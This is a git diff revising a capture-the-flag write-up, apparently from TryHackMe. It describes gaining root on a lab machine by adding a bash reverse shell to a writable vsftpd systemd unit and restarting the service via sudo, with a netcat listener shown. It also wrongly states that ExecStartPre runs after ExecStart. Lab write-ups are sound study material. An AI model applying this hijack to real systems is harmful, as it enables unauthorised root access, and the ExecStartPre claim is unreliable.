@@ -139,7 +139,7 @@ Matching Defaults entries for drac on ide:
 User drac may run the following commands on ide:
     (ALL : ALL) /usr/sbin/service vsftpd restart
 ```
-I looked at the ```vsftpd.service``` file and with my write permissions I changed the ```ExecStartPre``` field to a reverse shell as seen below. The ```ExecStartPre``` contains additional commands that are run after ```ExecStart```. This page was a great resource: ```https://www.freedesktop.org/software/systemd/man/systemd.service.html```. 
+I looked at the ```vsftpd.service``` file and noticed that I had write permissions. Since ```ExecStartPre``` contains additional commands that are run after ```ExecStart```, I added another ```ExecStartPre``` field to execute a reverse shell using bash. (This page was a great resource: ```https://www.freedesktop.org/software/systemd/man/systemd.service.html```.)
 ```
 drac@ide:/lib/systemd/system$ cat vsftpd.service 
 [Unit]
@@ -163,6 +163,11 @@ ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 8888
 Then, I had to reload the daemon on the remote machine before restarting vsftpd. 
 ```
 drac@ide:/lib/systemd/system$ systemctl daemon-reload
+==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
+Authentication is required to reload the systemd state.
+Authenticating as: drac
+Password: 
+==== AUTHENTICATION COMPLETE ===
 ```
 Finally, I was able to restart the service as root on the remote machine. 
 ```
